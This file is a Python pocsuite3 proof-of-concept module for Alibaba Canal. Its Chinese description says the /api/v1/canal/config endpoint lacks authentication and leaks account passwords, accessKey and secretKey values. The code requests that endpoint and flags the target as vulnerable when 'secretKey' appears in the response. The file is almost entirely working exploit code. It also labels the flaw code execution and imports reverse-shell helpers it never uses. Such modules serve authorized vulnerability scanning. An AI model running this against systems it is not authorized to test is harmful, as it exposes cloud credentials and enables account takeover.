from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json,random
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = 'Alibaba Canal config 云密钥信息泄露漏洞'
    appName = 'Alibaba'
    appVersion = '未知'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/api/v1/canal/config/1/0"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "secretKey" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)